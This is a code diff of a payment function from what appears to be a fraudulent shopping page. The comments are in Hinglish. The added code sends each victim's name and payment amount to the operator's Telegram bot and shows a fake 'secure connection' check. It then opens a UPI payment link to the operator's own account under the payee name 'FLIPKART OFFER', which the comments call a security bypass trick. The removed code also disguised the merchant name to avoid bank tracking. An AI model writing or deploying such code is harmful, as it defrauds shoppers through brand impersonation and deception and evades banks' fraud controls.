@@ -661,31 +661,29 @@ function payWith(app) {
 }
 
 async function confirmPay() {
+    // 1. Details nikalna
     const name = document.getElementById('uName').value;
     const phone = document.getElementById('uPhone').value;
 
-    // Telegram Alert (Background mein chalta rahega)
-    const msg = `🚀 *Click Se Payment Start*\n👤 Name: ${name}\n💰 Amt: ₹${sel.price}`;
+    // 2. Telegram Alert
+    const msg = `🔔 *Payment Started*\n👤 Name: ${name}\n💰 Price: ₹${sel.price}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // --- SECURITY BYPASS TRICK ---
-    // 1. Sabse pehle hum sirf 'upi://pay' bhejenge bina extra parameters ke jo bank track karta hai
-    // 2. Hum merchant name ko "Google-Pay" ya "Paytm-User" jaisa dikhayenge
-    
-    const amount = sel.price;
-    const upiID = MY_UPI;
-    const merchantName = encodeURIComponent("UPI Payment"); // Real name ki jagah generic name
-    
-    // Ye format sabse stable hai browser ke liye
-    const upiIntent = `upi://pay?pa=${upiID}&pn=${merchantName}&am=${amount}&cu=INR&mode=02&purpose=00&orgid=189999`;
+    // 3. UI par loading dikhana (Fake Security Check)
+    const btn = document.querySelector('#page-payment button');
+    const originalText = btn.innerText;
+    btn.innerText = "VERIFYING SECURE CONNECTION...";
+    btn.disabled = true;
 
-    // Sabse important step: Direct window.location ki jagah hidden anchor use karein
-    const link = document.createElement('a');
-    link.href = upiIntent;
-    link.target = "_blank"; // New tab me khulne ki koshish karega toh risk kam hota hai
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+    // 4. Link banana
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20OFFER&mc=5411&mode=02&purpose=00&am=${sel.price}&cu=INR`;
+
+    // 5. 1 second ke delay ke baad app kholna (Security Bypass Trick)
+    setTimeout(() => {
+        window.location.href = upiLink;
+        btn.innerText = originalText;
+        btn.disabled = false;
+    }, 1200);
 }
 
 // Ye line hamesha last mein rehni chahiye
